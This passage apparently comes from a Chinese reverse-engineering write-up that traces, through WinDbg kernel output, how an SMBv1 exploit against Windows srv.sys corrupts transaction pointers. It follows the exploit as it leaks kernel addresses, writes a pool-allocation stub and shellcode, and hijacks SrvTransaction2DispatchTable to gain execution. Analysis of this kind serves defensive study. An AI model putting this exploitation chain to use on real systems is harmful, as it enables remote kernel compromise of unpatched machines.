出了SrvFindTransaction函数调试到下面 根据数值和数据包可以大胆猜测偏移0x10的是Parameter Offset，0x1c的是Data Offset 下面就进入memmove那里了由于ParameterCount为0，就只进入第二个memmove那里了 先看一下参数，复制的大小是DataCount的值0x150，目标是fffff8a002c46050 123456789kd&gt; psrv!SrvSmbNtTransactionSecondary+0x2fe:fffff880`0507de32 e8093af8ff call srv!memmove (fffff880`05001840)kd&gt; r rcx rcx=fffff8a002c46050kd&gt; r rdxrdx=fffffa801d4910d8kd&gt; r r8r8=0000000000000150 目标地址是第一次trans Request的数据（这样会被覆盖吧） 那么这里DataDisplacementCopy为0，导致覆盖了前一个transaction的InData指向的地址 但是发现其实前150个字节是一样的，汗~ 接下来对对应的transaction的对应字段加上相应的值 到这其实有个问题，就是实际上transaction的数据并没有增大，这个datacout应该是虚增了，但看不出什么问题 12fffff880`0507deb6 4401b6a4000000 add dword ptr [rsi+0A4h],r14d ds:002b:fffff8a0`02c420b4=000010c0fffff880`0507debd 4401be98000000 add dword ptr [rsi+98h],r15d ds:002b:fffff8a0`02c420a8=00000004 再下面就到了SrvDereferenceConnection，没进入if，直接出来了 SrvSmbNtTransactionSecondary出来了就到了SrvEndSmbProcessing 一次偶然发现第一次nt response和第二次的nt response内存中的地址是一样的 1234567kd&gt; gBreakpoint 5 hitsrv!SrvStartSend:fffff880`0500dd20 48895c2408 mov qword ptr [rsp+8],rbxkd&gt; dc poi(rcx+0xc0) l50fffffa80`1d495220 424d53ff 000000a0 c0039800 00000000 .SMB............fffffa80`1d495230 00000000 00000000 741b0802 29e10802 ...........t...) 123456kd&gt; gBreakpoint 1 hitsrv!SrvStartSend2:fffff880`05003b20 48895c2408 mov qword ptr [rsp+8],rbxkd&gt; dc poi(rcx+0xc0) l50fffffa80`1d495220 424d53ff 000000a0 c0039800 00000000 .SMB............ 所以我在获取了第一次的地址后，对c0偏移位置下写入断点就好了，果然断下来了，原来调用了RestartTransactionResponse函数 再一步步跟原来调用了RestartTransactionResponse函数，终于找到点子上了 首先将第一个response包的DataCount给到一个局部变量，这个局部变量其实就是下面要用到的dataDisplacement 之后便是一些赋值，计算操作（这个对整个分析的理解是很重要的，当然这个过程我也结合了数据包中的数据） 接下来就将第一次的nt response的OutData再偏移dataDisplacement（0x10b8） 看看复制的源地址是什么，这个地址刚好是第一次nt response的OutData的后面 123456789101112131415161718kd&gt; dq poi(rbx+88)+10b8 l21fffff8a0`02836108 bfbce2e1`834ca2db 00000000`00000000fffff8a0`02836118 00000000`00000000 67617246`03020100fffff8a0`02836128 00000000`00000000 00000000`00005120fffff8a0`02836138 00000000`00000000 65657246`00010102fffff8a0`02836148 00000000`00000000 7274534c`03eb0101fffff8a0`02836158 fffff880`00969ff0 00000000`00000e8cfffff8a0`02836168 00000000`00000000 00000000`0e8c020cfffff8a0`02836178 fffffa80`1ddcc4d0 fffffa80`1d4d2b90fffff8a0`02836188 fffff8a0`01bd8a90 fffff8a0`02a9b650fffff8a0`02836198 fffff8a0`02268048 fffff8a0`02831038fffff8a0`028361a8 00000000`00000000 00000000`00020000fffff8a0`028361b8 fffff8a0`02836268 ffffffff`000061eafffff8a0`028361c8 00000000`00000000 fffff8a0`0283626cfffff8a0`028361d8 00000000`00000000 fffff8a0`0283626cfffff8a0`028361e8 fffff8a0`028362fc fffff8a0`0283626cfffff8a0`028361f8 fffff8a0`02836ffc 00000000`00000000fffff8a0`02836208 00000000`00000000 这里我们看到了熟悉的fffffa801d4d2b90，这个就是CONNECTION结构地址 再看看这个地址有什么符号，我们看到了srv!SrvGlobalSpinLocks+0x70，这个应该就是SRV global data pointer 1234567891011121314151617kd&gt; dqs fffffa80`1d4d2b90fffffa80`1d4d2b90 00000016`04700202fffffa80`1d4d2b98 00000000`00000000fffffa80`1d4d2ba0 00000000`00000000fffffa80`1d4d2ba8 00000000`00000000fffffa80`1d4d2bb0 00000000`00000000fffffa80`1d4d2bb8 00000000`00000000fffffa80`1d4d2bc0 00000000`00000000fffffa80`1d4d2bc8 fffff880`0501af50 srv!SrvGlobalSpinLocks+0x70fffffa80`1d4d2bd0 fffffa80`1d48a600fffffa80`1d4d2bd8 00000000`ffffffedfffffa80`1d4d2be0 fffffa80`1a590990fffffa80`1d4d2be8 80010000`00004000fffffa80`1d4d2bf0 00000000`00000001fffffa80`1d4d2bf8 fffffa80`1d4d1dd0fffffa80`1d4d2c00 fffffa80`1d4a7040fffffa80`1d4d2c08 fffffa80`1d48a600 泄露 SRV global data pointer经过一番调试，费了一上午，突然想到，既然已经知道CONNECTION的地址了，那么我对CONNECTION的那个偏移下读取断点不就行了 1bp srv!RestartTransactionResponse+0x288 &quot;dqs poi(rdx+78);ba r8 poi(rdx+78)+38&quot; 由于ba r8 poi(rdx+78)+38这个断点断了很多，最后断到了memmove，结果一时手快，直接g，错过了 后来还是辛苦的断了下来，原来是SrvCompleteExecuteTransaction调用的memmove 12345678910111213141516171819202122232425......kd&gt; gBreakpoint 11 hitsrv!SrvFsdRequeueReceiveWorkItem+0xab:fffff880`05002e6b 408af0 mov sil,alkd&gt; gBreakpoint 11 hitsrv!SrvFsdRequeueReceiveWorkItem+0xe6:fffff880`05002ea6 8b4704 mov eax,dword ptr [rdi+4]kd&gt; gBreakpoint 11 hitsrv!SrvFsdRequeueReceiveWorkItem+0xab:fffff880`05002e6b 408af0 mov sil,alkd&gt; gBreakpoint 11 hitsrv!SrvFsdRequeueReceiveWorkItem+0xe6:fffff880`05002ea6 8b4704 mov eax,dword ptr [rdi+4]kd&gt; gBreakpoint 11 hitsrv!memmove+0x1c5:fffff880`05001a05 4883e908 sub rcx,8kd&gt; kvChild-SP RetAddr : Args to Child : Call Sitefffff880`05ee8ad8 fffff880`05049013 : fffffa80`1d48a648 00000000`0000000f 00000000`00000000 00000000`00000001 : srv!memmove+0x1c5fffff880`05ee8ae0 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : srv!SrvCompleteExecuteTransaction+0x433 可以再下个断点确认一下 123456789101112131415161718192021kd&gt; gBreakpoint 5 hitsrv!SrvCompleteExecuteTransaction+0x42e:fffff880`0504900e e82d88fbff call srv!memmove (fffff880`05001840)kd&gt; dqs rdxfffffa80`1d4d4480 00000045`04700202fffffa80`1d4d4488 00000000`00000000fffffa80`1d4d4490 00000000`00000000fffffa80`1d4d4498 00000000`00000000fffffa80`1d4d44a0 00000000`00000000fffffa80`1d4d44a8 00000000`00000000fffffa80`1d4d44b0 00000000`00000000fffffa80`1d4d44b8 fffff880`0501af78 srv!SrvGlobalSpinLocks+0x98fffffa80`1d4d44c0 fffffa80`1d48a600fffffa80`1d4d44c8 00000000`ffffffa8fffffa80`1d4d44d0 fffffa80`19f51110fffffa80`1d4d44d8 80060000`00004000fffffa80`1d4d44e0 00000000`00000006fffffa80`1d4d44e8 fffffa80`1d4d1dd0fffffa80`1d4d44f0 fffffa80`1e287680fffffa80`1d4d44f8 fffffa80`1d48a600 这个函数跟了下，复制大小是0x40，复制的起始地址是正是CONNECTION的其实地址 那应该是覆盖了附近的transaction的OutData指针了 在SrvSmbTransactionSecondary+0x2cf 下个断点（即里面的memmove那里） 1234567891011121314151617181920212223242526272829303132kd&gt; bp srv!SrvSmbTransactionSecondary+0x2cf &quot;.if (@r8 &gt; 0x8) &#123;r rdx;r r8;db rdx l100;.echo ----------&#125;.else&#123;gc&#125;&quot;kd&gt; grdx=fffffa8019b51492r8=0000000000000028fffffa80`19b51492 90 16 4d 1d 80 fa ff ff-04 00 00 00 00 00 00 00 ..M.............fffffa80`19b514a2 00 00 00 00 00 00 00 00-10 00 00 00 00 00 00 00 ................fffffa80`19b514b2 00 00 00 00 40 00 00 00-04 00 00 00 00 00 54 5d ....@.........T]fffffa80`19b514c2 04 00 00 00 00 00 53 5d-04 00 00 00 00 00 52 5d ......S]......R]fffffa80`19b514d2 04 00 00 00 00 00 51 5d-04 00 00 00 00 00 d0 5c ......Q].......\\fffffa80`19b514e2 04 00 00 00 00 00 cf 5c-04 00 00 00 00 00 4e 5c .......\\......N\\fffffa80`19b514f2 04 00 00 00 00 00 cd 5c-04 00 00 00 00 00 cc 5c .......\\.......\\fffffa80`19b51502 04 00 00 00 00 00 cb 5c-04 00 00 00 00 00 ca 5c .......\\.......\\fffffa80`19b51512 04 00 00 00 00 00 c9 5c-04 00 00 00 00 00 c8 5c .......\\.......\\fffffa80`19b51522 04 00 00 00 00 00 c7 5c-04 00 00 00 00 00 c6 5c .......\\.......\\fffffa80`19b51532 04 00 00 00 00 00 c5 5c-04 00 00 00 00 00 c4 5c .......\\.......\\fffffa80`19b51542 04 00 00 00 00 00 43 5d-04 00 00 00 00 00 42 5d ......C]......B]fffffa80`19b51552 04 00 00 00 00 00 41 5d-04 00 00 00 00 00 40 5d ......A]......@]fffffa80`19b51562 04 00 00 00 00 00 3f 5d-04 00 00 00 00 00 3e 5d ......?]......&gt;]fffffa80`19b51572 04 00 00 00 00 00 3d 5d-04 00 00 00 00 00 3c 5d ......=]......&lt;]fffffa80`19b51582 04 00 00 00 00 00 3b 5d-04 00 00 00 00 00 ba 5c ......;].......\\----------srv!SrvSmbTransactionSecondary+0x2cf:fffff880`0507e37f e8bc34f8ff call srv!memmove (fffff880`05001840)kd&gt; kvChild-SP RetAddr : Args to Child : Call Sitefffff880`044afa20 fffff880`050039a0 : 00000000`00000000 ffffc7b4`00000000 fffffa80`00000042 00000000`00000088 : srv!SrvSmbTransactionSecondary+0x2cffffff880`044afab0 fffff880`05003607 : fffffa80`19b50010 fffffa80`1d4d1690 fffffa80`19b50a90 fffff880`0501a158 : srv!SrvProcessSmb+0x230fffff880`044afb20 fffff880`05043572 : fffffa80`1d48a600 fffffa80`19b50010 00000000`00000000 fffffa80`19b50020 : srv!SrvRestartReceive+0x10ffffff880`044afb60 fffff800`1afb1e3e : fffff8a0`02a765a0 fffffa80`1d48a600 00000000`00000080 fffffa80`1d45fdf0 : srv! ?? ::NNGAKEGL::`string&apos;+0x42effffff880`044afbe0 fffff800`1ac40521 : fffffa80`19aafb00 fffff8a0`02a765a0 fffff8a0`01b0e478 fffff8a0`00308a70 : nt!IopThreadStart+0x26fffff880`044afc10 fffff800`1ac7edd6 : fffff800`1af14180 fffffa80`19aafb00 fffffa80`1cbab080 fffffa80`18c5f980 : nt!PspSystemThreadStartup+0x59fffff880`044afc60 00000000`00000000 : fffff880`044b0000 fffff880`044aa000 00000000`00000000 00000000`00000000 : nt!KxStartSystemThread+0x16 其实我们注意到复制的源地址的第一个8字节就是泄露出来的CONNECTION地址 目标地址如下：而这个应该就是“另一个transaction”OutData指针的位置 123456789kd&gt; dq rcxfffff8a0`0292c1f8 fffff8a0`0292cffc 00000000`00000000fffff8a0`0292c208 00000000`00000000 00000000`00000d00fffff8a0`0292c218 00000000`00000090 00000101`00000000fffff8a0`0292c228 08022cfa`08020000 00000000`0000f278fffff8a0`0292c238 00000000`00000000 00000000`00000000fffff8a0`0292c248 00000000`00000000 00000000`00010101fffff8a0`0292c258 00000000`00000000 00000000`00000000fffff8a0`0292c268 00000000`00000000 00000000`00000000 注释后的ida代码， 再结合下面的数据包中的数据，首先DataCount是0x28（40），就是上面memmove的大小 再看DataOffset是0x42，其实这个偏移刚好是数据包中CONNECTION的地址 还有一个DataDisplacement，这是控制能够覆盖到附近transaction的OutData的保证 泄露Transaction2Dispatch Table这个是在SRV global data pointer的地址的基础上在前面0x1000偏移处开始寻找 以某次找到的SRV global data pointer地址： 0xFFFFF8800501AF28为例 请求的地址依次如下：（每次递增0x200） 1234560xFFFFF88005019F280xFFFFF8800501A1280xFFFFF8800501A3280xFFFFF8800501A5280xFFFFF8800501A7280xFFFFF8800501A928 从下面可以看到利用的目标地址都是相同的fffff8a0029471f8 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556kd&gt; grcx=fffff8a0029471f8rdx=fffffa8019b2f492r8=0000000000000028fffffa80`19b2f492 28 9f 01 05 80 f8 ff ff-04 00 00 00 00 00 00 00 (...............-----------------------kd&gt; gBreakpoint 1 hitsrv!SrvCompleteExecuteTransaction+0x42e:fffff880`0504900e e82d88fbff call srv!memmove (fffff880`05001840)kd&gt; grcx=fffff8a0029471f8rdx=fffffa8019b78492r8=0000000000000028fffffa80`19b78492 28 a1 01 05 80 f8 ff ff-04 00 00 00 00 00 00 00 (...............-----------------------kd&gt; gBreakpoint 1 hitsrv!SrvCompleteExecuteTransaction+0x42e:fffff880`0504900e e82d88fbff call srv!memmove (fffff880`05001840)kd&gt; grcx=fffff8a0029471f8rdx=fffffa801d4910d2r8=0000000000000028fffffa80`1d4910d2 28 a3 01 05 80 f8 ff ff-04 00 00 00 00 00 00 00 (...............-----------------------kd&gt; gBreakpoint 1 hitsrv!SrvCompleteExecuteTransaction+0x42e:fffff880`0504900e e82d88fbff call srv!memmove (fffff880`05001840)kd&gt; grcx=fffff8a0029471f8rdx=fffffa801d495262r8=0000000000000028fffffa80`1d495262 28 a5 01 05 80 f8 ff ff-04 00 00 00 00 00 00 00 (...............-----------------------kd&gt; gBreakpoint 1 hitsrv!SrvCompleteExecuteTransaction+0x42e:fffff880`0504900e e82d88fbff call srv!memmove (fffff880`05001840)kd&gt; grcx=fffff8a0029471f8rdx=fffffa801d4910d2r8=0000000000000028fffffa80`1d4910d2 28 a7 01 05 80 f8 ff ff-04 00 00 00 00 00 00 00 (...............-----------------------kd&gt; gBreakpoint 1 hitsrv!SrvCompleteExecuteTransaction+0x42e:fffff880`0504900e e82d88fbff call srv!memmove (fffff880`05001840)kd&gt; grcx=fffff8a0029471f8rdx=fffffa801d495262r8=0000000000000028fffffa80`1d495262 28 a9 01 05 80 f8 ff ff-04 00 00 00 00 00 00 00 (...............----------------------- 猜想是根据Transaction2Dispatch Table前面的特征确认的吧，因为前面搜到的包都没有0xfefefefe的，只有Transaction2Dispatch Table有，假如我写代码可能会这么判断，还有就是这个表后面的两个函数指针是保留指针，所以地址相同，这个可以进一步判断 一步步获得执行权限注：下面可能为多次调试，地址会变了，但最后一个字节应该是一样的 确认可执行内存（其实是查找nt!KxUnexpectedInterrupt0）第一次请求 1234567891011121314151617181920kd&gt; grcx=fffff8a002b8b1f8rdx=fffffa801d4910d2r8=0000000000000028fffffa80`1d4910d2 fffffa80`1ab79468fffffa80`1d4910da 00000000`00000004fffffa80`1d4910e2 00000000`00000000fffffa80`1d4910ea 00000000`00000010fffffa80`1d4910f2 00000008`00000000fffffa80`1d4910fa 214566a9`5cd855bcfffffa80`1d491102 995a4c01`7568295bfffffa80`1d49110a cde73a8f`4b46d657fffffa80`1d491112 2074631c`2642b6d5fffffa80`1d49111a 6d075bd2`381cc2b5fffffa80`1d491122 3507fd35`8ec65767fffffa80`1d49112a 46ef33c5`fb8019bcfffffa80`1d491132 7d035bce`e8ab0172fffffa80`1d49113a 27ac73f0`53a151b0fffffa80`1d491142 2c02a856`90036e2afffffa80`1d49114a cff25698`1fc097a9 读取的核心内容如下： 1fffffa80`1ab79468 fffffa80`1d48a600 根据命令行的输出，这个是PreferredWorkQueue的地址 那么这个fffffa801ab79468地址是怎么来的呢，经过下个巧妙的断点，再ctrl+f，就找到了 断点如下 1bp srv!SrvSmbTransactionSecondary+0x2cf &quot;.if (@r8 &gt; 0x8) &#123;r rcx;r rdx;r r8;dqs rdx;.echo ***************************;dqs poi(rdx);.echo -----------------------&#125;.else&#123;gc&#125;&quot; 我们发现fffffa801ab79468就在CONNECTION地址的0x78偏移处 12345678910111213141516fffffa80`1ab793f0 0000004a`04700202fffffa80`1ab793f8 00000000`00000000fffffa80`1ab79400 00000000`00000000fffffa80`1ab79408 00000000`00000000fffffa80`1ab79410 00000000`00000000fffffa80`1ab79418 00000000`00000000fffffa80`1ab79420 00000000`00000000fffffa80`1ab79428 fffff880`0501afa0 srv!SrvGlobalSpinLocks+0xc0fffffa80`1ab79430 fffffa80`1d48a600fffffa80`1ab79438 00000000`ffffffa8fffffa80`1ab79440 fffffa80`1de24a50fffffa80`1ab79448 80130000`00004000fffffa80`1ab79450 00000000`00000013fffffa80`1ab79458 fffffa80`1d4d1dd0fffffa80`1ab79460 fffffa80`19aa6040fffffa80`1ab79468 fffffa80`1d48a600 之后就会泄露PreferredWorkQueue+0x198：即读取fffffa801d48a798的值 123456789kd&gt; grcx=fffff8a002a241f8rdx=fffffa801d4910d2r8=0000000000000028fffffa80`1d4910d2 fffffa80`1d48a798......***************************fffffa80`1d48a798 fffffa80`1d48e040...... 而获取到的 fffffa801d48e040正是IrpThread KProcess的值便是IrpThread+0x220处的值 12kd&gt; dqs fffffa801d48e040+0x220fffffa80`1d48e260 fffffa80`18c5f980 ProcessListEntry.Blink是在KProcess+0x240处（到这才有符号，汗，没控制台的输出那就很难搞了） 12kd&gt; dqs fffffa80`18c5f980+0x240 l1fffffa80`18c5fbc0 fffff800`1aeefc80 nt!KiProcessListHead 接下来不断向后搜寻从fffff8001ac20000开始向前寻找，在fffff8001ac1e000找到了Nt的基址（Base of Nt） 123fffff800`1ac20000 nt!XpressDecodeCreate+0x20fffff800`1ac1f000 nt! ?? ::FNODOBFM::`string&apos;+0x4c05afffff800`1ac1e000 nt!`string&apos; &lt;PERF&gt; (nt+0x0) 那是怎么确定这就是Nt的基址呢？（感觉有点不靠谱，就一个MZ） 在之后就泄露下面两个地址（我猜测nt!KxUnexpectedInterrupt0是通过Nt的基址算出来的） 12fffff800`1ac1e258 nt!`string&apos; &lt;PERF&gt; (nt+0x258)fffff800`1ae8f000 nt!KxUnexpectedInterrupt0 而nt!KxUnexpectedInterrupt0正是可读可写地址 写入一些数据及SrvTransaction2DispatchTable函数指针改写首先将fffff8001ae8f000覆盖一个transaction的InData指针，为写入shellcode做准备 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576kd&gt; rrax=0000000000000000 rbx=fffffa801de91820 rcx=0000000000000000rdx=0000000000004fe0 rsi=fffff8a002948010 rdi=0000000000000002rip=fffff8800507e364 rsp=fffff88004f1ea20 rbp=fffffa8019f45010 r8=0000000000000042 r9=fffffa8019f46450 r10=0000000000000000r11=0000000000000026 r12=fffffa8019f46450 r13=0000000000000001r14=0000000000000008 r15=0000000000000000iopl=0 nv up ei pl nz na pe nccs=0010 ss=0018 ds=002b es=002b fs=0053 gs=002b efl=00000202srv!SrvSmbTransactionSecondary+0x2b4:fffff880`0507e364 8b8c24a8000000 mov ecx,dword ptr [rsp+0A8h] ss:0018:fffff880`04f1eac8=00004fe0kd&gt; tsrv!SrvSmbTransactionSecondary+0x2bb:fffff880`0507e36b 8b9424a0000000 mov edx,dword ptr [rsp+0A0h]kd&gt; tsrv!SrvSmbTransactionSecondary+0x2c2:fffff880`0507e372 4d8bc6 mov r8,r14kd&gt; tsrv!SrvSmbTransactionSecondary+0x2c5:fffff880`0507e375 48038e80000000 add rcx,qword ptr [rsi+80h]kd&gt; rrax=0000000000000000 rbx=fffffa801de91820 rcx=0000000000004fe0rdx=0000000000000042 rsi=fffff8a002948010 rdi=0000000000000002rip=fffff8800507e375 rsp=fffff88004f1ea20 rbp=fffffa8019f45010 r8=0000000000000008 r9=fffffa8019f46450 r10=0000000000000000r11=0000000000000026 r12=fffffa8019f46450 r13=0000000000000001r14=0000000000000008 r15=0000000000000000iopl=0 nv up ei pl nz na pe nccs=0010 ss=0018 ds=002b es=002b fs=0053 gs=002b efl=00000202srv!SrvSmbTransactionSecondary+0x2c5:fffff880`0507e375 48038e80000000 add rcx,qword ptr [rsi+80h] ds:002b:fffff8a0`02948090=fffff8a002948310kd&gt; dqs fffff8a002948310+4fe0fffff8a0`0294d2f0 fffff8a0`0291a170fffff8a0`0294d2f8 fffff8a0`0294dffcfffff8a0`0294d300 00000000`00000000fffff8a0`0294d308 00000000`00000000fffff8a0`0294d310 000002ec`00000c50fffff8a0`0294d318 00000000`00001000fffff8a0`0294d320 00000101`00000000fffff8a0`0294d328 08005f5d`08000000fffff8a0`0294d330 00000000`00000000fffff8a0`0294d338 00000000`00000000fffff8a0`0294d340 00000000`00000000fffff8a0`0294d348 00000000`00000000fffff8a0`0294d350 00000000`00010101fffff8a0`0294d358 00000000`00000000fffff8a0`0294d360 00000000`00000000fffff8a0`0294d368 00000000`00000000kd&gt; dqs fffff8a002948310+4fe0-0x80fffff8a0`0294d270 00000000`0d8c020cfffff8a0`0294d278 fffffa80`19a64dd0fffff8a0`0294d280 fffffa80`1de91600fffff8a0`0294d288 fffff8a0`07575310fffff8a0`0294d290 fffff8a0`02a4e2d0fffff8a0`0294d298 fffff8a0`02953298fffff8a0`0294d2a0 fffff8a0`02926298fffff8a0`0294d2a8 00000000`00000000fffff8a0`0294d2b0 00000000`00020000fffff8a0`0294d2b8 fffff8a0`0294d368fffff8a0`0294d2c0 00000001`0000aec0fffff8a0`0294d2c8 00000000`00000000fffff8a0`0294d2d0 fffff8a0`0294d36cfffff8a0`0294d2d8 00000000`00000000fffff8a0`0294d2e0 fffff8a0`0294d36cfffff8a0`0294d2e8 fffff8a0`0294d3ackd&gt; psrv!SrvSmbTransactionSecondary+0x2cc:fffff880`0507e37c 4903d4 add rdx,r12kd&gt; psrv!SrvSmbTransactionSecondary+0x2cf:fffff880`0507e37f e8bc34f8ff call srv!memmove (fffff880`05001840)kd&gt; r rcx;r rdx;r r8;dqs rdx l1rcx=fffff8a00294d2f0rdx=fffffa8019f46492r8=0000000000000008fffffa80`19f46492 fffff800`1ae8f000 nt!KxUnexpectedInterrupt0 在数据包体现如下： 之后将一些数据复制到fffff8001ae8f000（nt!KxUnexpectedInterrupt0） 123456789101112131415161718192021222324252627282930313233343536373839kd&gt; psrv!SrvSmbTransactionSecondary+0x2cf:fffff880`0507e37f e8bc34f8ff call srv!memmove (fffff880`05001840)kd&gt; dqs rcxfffff800`1ae8f000 00000000`00000000fffff800`1ae8f008 00000000`00000000fffff800`1ae8f010 00000000`00000000fffff800`1ae8f018 00000000`00000000fffff800`1ae8f020 00000000`00000000fffff800`1ae8f028 00000000`00000000fffff800`1ae8f030 00000000`00000000fffff800`1ae8f038 00000000`00000000fffff800`1ae8f040 00000000`00000000fffff800`1ae8f048 00000000`00000000fffff800`1ae8f050 00000000`00000000fffff800`1ae8f058 00000000`00000000fffff800`1ae8f060 00000000`00000000fffff800`1ae8f068 00000000`00000000fffff800`1ae8f070 00000000`00000000fffff800`1ae8f078 00000000`00000000kd&gt; dqs rdxfffffa80`1d4910d2 00002025`048b4865fffffa80`1d4910da 31000008`b0054800fffffa80`1d4910e2 48000000`1e158bc9fffffa80`1d4910ea c4834810`ff20ec83fffffa80`1d4910f2 05894807`74c08520fffffa80`1d4910fa 000000c3`00000001fffffa80`1d491102 000e4d00`00000000fffffa80`1d49110a 2a969ca5`ecab4b00fffffa80`1d491112 a9de88cb`491de58afffffa80`1d49111a 3801ef46`5ee55211fffffa80`1d491122 dd8aaf7b`a51450d2fffffa80`1d49112a 9014a39f`e9ac2946fffffa80`1d491132 e988be8a`6a2841cdfffffa80`1d49113a d4368226`6aae25f2fffffa80`1d491142 d175284b`b478ce65fffffa80`1d49114a c52f5324`db21de6fkd&gt; r r8r8=0000000000000039 数据包体现 复制了上面这些数据后，再将目标transaction的InData指针替换为fffff8800501a990：srv!SrvTransaction2DispatchTable+0x70，为改写这个表做准备 12345678910111213141516171819202122232425262728293031323334353637kd&gt; psrv!SrvSmbTransactionSecondary+0x2cf:fffff880`0507e37f e8bc34f8ff call srv!memmove (fffff880`05001840)kd&gt; dqs rdxfffffa80`1d495262 fffff880`0501a990 srv!SrvTransaction2DispatchTable+0x70fffffa80`1d49526a 00000000`00000004fffffa80`1d495272 00000000`00000000fffffa80`1d49527a 00000000`00000010fffffa80`1d495282 00000002`00000000fffffa80`1d49528a 4e414c02`00323030fffffa80`1d495292 0200312e`324e414dfffffa80`1d49529a 2e30204d`4c20544efffffa80`1d4952a2 00000000`00003231fffffa80`1d4952aa 00000000`00000000fffffa80`1d4952b2 00000000`00000000fffffa80`1d4952ba 00000000`00000000fffffa80`1d4952c2 00000000`00000000fffffa80`1d4952ca 00000000`00000000fffffa80`1d4952d2 00000000`00000000fffffa80`1d4952da 00000000`00000000kd&gt; dqs rcxfffff8a0`05c5f2f0 fffff800`1ae8f000 nt!KxUnexpectedInterrupt0fffff8a0`05c5f2f8 fffff8a0`05c5fffcfffff8a0`05c5f300 00000000`00000000fffff8a0`05c5f308 00000000`00000000fffff8a0`05c5f310 00000325`00000c50fffff8a0`05c5f318 00000000`00001000fffff8a0`05c5f320 00000101`00000000fffff8a0`05c5f328 0800226e`08000000fffff8a0`05c5f330 00000000`00000000fffff8a0`05c5f338 00000000`00000000fffff8a0`05c5f340 00000000`00000000fffff8a0`05c5f348 00000000`00000000fffff8a0`05c5f350 00000000`00010101fffff8a0`05c5f358 00000000`00000000fffff8a0`05c5f360 00000000`00000000fffff8a0`05c5f368 00480000`00650000 接下来就可以修改srv!SrvTransaction2DispatchTable+0x70的位置为nt!KxUnexpectedInterrupt0了 123456789kd&gt; gsrv!SrvSmbTransactionSecondary+0x2cf:fffff880`0507e37f e8bc34f8ff call srv!memmove (fffff880`05001840)kd&gt; r r8r8=0000000000000008kd&gt; dqs rdx l1fffffa80`1d495262 fffff800`1ae8f000 nt!KxUnexpectedInterrupt0kd&gt; dqs rcx l1fffff880`0501a990 fffff880`050796e8 srv!SrvTransactionNotImplemented 一开始不知道为什么复制这些数据到那里，又要修改SrvTransaction2DispatchTable+0x70，后来下断点发现调用了这里的代码，原来这个数据也算是一个小shellcode 123456789101112nt!KxUnexpectedInterrupt0:fffff800`1ae8f000 65488b042520000000 mov rax,qword ptr gs:[20h] gs:002b:00000000`00000020=fffff8001af14180fffff800`1ae8f009 4805b0080000 add rax,8B0hfffff800`1ae8f00f 31c9 xor ecx,ecxfffff800`1ae8f011 8b151e000000 mov edx,dword ptr [nt!KxUnexpectedInterrupt0+0x35 (fffff800`1ae8f035)]fffff800`1ae8f017 4883ec20 sub rsp,20hfffff800`1ae8f01b ff10 call qword ptr [rax]fffff800`1ae8f01d 4883c420 add rsp,20hfffff800`1ae8f021 85c0 test eax,eaxfffff800`1ae8f023 7407 je nt!KxUnexpectedInterrupt0+0x2c (fffff800`1ae8f02c)fffff800`1ae8f025 48890501000000 mov qword ptr [nt!KxUnexpectedInterrupt0+0x2d (fffff800`1ae8f02d)],raxfffff800`1ae8f02c c3 ret 原来这里调用了分配pool内存的函数 1fffff800`1ae8f01b ff10 call qword ptr [rax] ds:002b:fffff800`1af14a30=&#123;nt!ExAllocatePoolWithTag (fffff800`1ae8d040)&#125; 大小是e4d（这个跟下面shellcode的大小是一致的） 1234kd&gt; r rcx;r rdx;r r8rcx=0000000000000000rdx=0000000000000e4dr8=fffffa801decf450 最后将分配的内存首地址复制给nt!KxUnexpectedInterrupt0+0x2d 1234nt!KxUnexpectedInterrupt0+0x25:fffff800`1ae8f025 48890501000000 mov qword ptr [nt!KxUnexpectedInterrupt0+0x2d (fffff800`1ae8f02d)],raxkd&gt; r raxrax=fffffa8018e2e010 之后就会读取nt!KxUnexpectedInterrupt0+0x2d的值，再向这个读取到的地址写入shellcode。（调试过程也看到要泄露nt!KxUnexpectedInterrupt0+0x2d的值，到这里就明白了） shellcode的写入下断点： 1bp srv!SrvSmbTransactionSecondary+0x2cf &quot;r r8;dqs rdx;.echo *****;dqs rcx;.echo -------------------;gc&quot; 首先将一个transaction的InData改写为fffffa8018e8e010 123456r8=0000000000000008fffffa80`1decf492 fffffa80`18e8e010......*****fffff8a0`0295c2f0 fffff8a0`0288c170...... 之后向fffffa8018e8e010复制shellcode（我将shellcode前面改为0xcc开头了，好辨别） 12345678910111213141516171819202122232425262728293031323334r8=0000000000000e4dfffffa80`1d4910d2 ccccc300`000001e8fffffa80`1d4910da cccccccc`ccccccccfffffa80`1d4910e2 cccccccc`ccccccccfffffa80`1d4910ea cccccccc`ccccccccfffffa80`1d4910f2 cccccccc`ccccccccfffffa80`1d4910fa cccccccc`ccccccccfffffa80`1d491102 cccccccc`ccccccccfffffa80`1d49110a cccccccc`ccccccccfffffa80`1d491112 cccccccc`ccccccccfffffa80`1d49111a cccccccc`ccccccccfffffa80`1d491122 cccccccc`ccccccccfffffa80`1d49112a cccccccc`ccccccccfffffa80`1d491132 cccccccc`ccccccccfffffa80`1d49113a cccccccc`ccccccccfffffa80`1d491142 019fcccc`ccccccccfffffa80`1d49114a 14b95ba4`45890000*****fffffa80`18e8e010 00000000`00000000fffffa80`18e8e018 54bde856`dffbacaafffffa80`18e8e020 820890aa`408fa7fcfffffa80`18e8e028 cc191a94`8d615dfbfffffa80`18e8e030 55f0bdc2`c159734bfffffa80`18e8e038 1a4e964d`3060b970fffffa80`18e8e040 c95d31de`28434a9dfffffa80`18e8e048 5b34921b`9f1c681cfffffa80`18e8e050 082dddca`859bf538fffffa80`18e8e058 5e4f0e40`e0079508fffffa80`18e8e060 6ba205e4`70890952fffffa80`18e8e068 779b5234`8a685c21fffffa80`18e8e070 1f95de82`06f96739fffffa80`18e8e078 13c4aeac`e812a79cfffffa80`18e8e080 4f257902`8c95f77dfffffa80`18e8e088 2be47417`95c0b867 shellcode前面的字节是软件作者自己加到shellcode前面的，其实就是跳转到shellcode，这样不知有什么好处 触发shellcode的执行先将那个transaction的InData改为srv!SrvTransaction2DispatchTable+0x70 123456r8=0000000000000008fffffa80`1d495262 fffff880`0501a990 srv!SrvTransaction2DispatchTable+0x70......*****fffff8a0`0295c2f0 fffffa80`18e8e010...... 之后在srv!SrvTransaction2DispatchTable+0x70处写入shellcode地址（fffffa8018e8e010） 123456r8=0000000000000008fffffa80`1e2f7492 fffffa80`18e8e010......*****fffff880`0501a990 fffff800`1ae8f000 nt!KxUnexpectedInterrupt0...... 